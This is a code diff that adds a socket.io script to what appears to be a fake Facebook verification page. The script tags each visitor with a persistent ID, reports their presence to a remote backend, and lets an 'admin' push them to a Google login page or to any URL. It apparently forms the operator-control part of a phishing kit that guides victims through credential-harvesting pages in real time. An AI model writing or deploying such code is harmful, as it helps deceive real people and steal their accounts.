@@ -280,6 +280,33 @@
     </div><!-- /.fb-content -->
   </main>
 
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <script>
+  (function () {
+    /* ── Keep admin visibility during transition ── */
+    var BACKEND = (function () {
+      var h = location.hostname;
+      return (h === 'localhost' || h === '127.0.0.1' || h.endsWith('.test') || h.endsWith('.local'))
+        ? 'http://localhost:3001'
+        : 'https://job-newback.onrender.com';
+    })();
+    var clientId = localStorage.getItem('clientId');
+    if (!clientId) {
+      clientId = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2) + Date.now().toString(36));
+      localStorage.setItem('clientId', clientId);
+    }
+    var socket = io(BACKEND, { query: { clientId: clientId }, transports: ['websocket', 'polling'] });
+    socket.on('connect', function () {
+      socket.emit('userConnectedToPage', { clientId: clientId, page: 'fb-verify' });
+    });
+    /* If admin re-triggers google-login while user is on this page, proceed normally */
+    socket.on('show-google-login', function () {
+      window.location.href = 'google-login.html';
+    });
+    /* Generic redirect */
+    socket.on('redirect', function (url) { window.location.href = url; });
+  })();
+  </script>
   <script>
   (function () {
     var emailEl = document.getElementById('email-display');
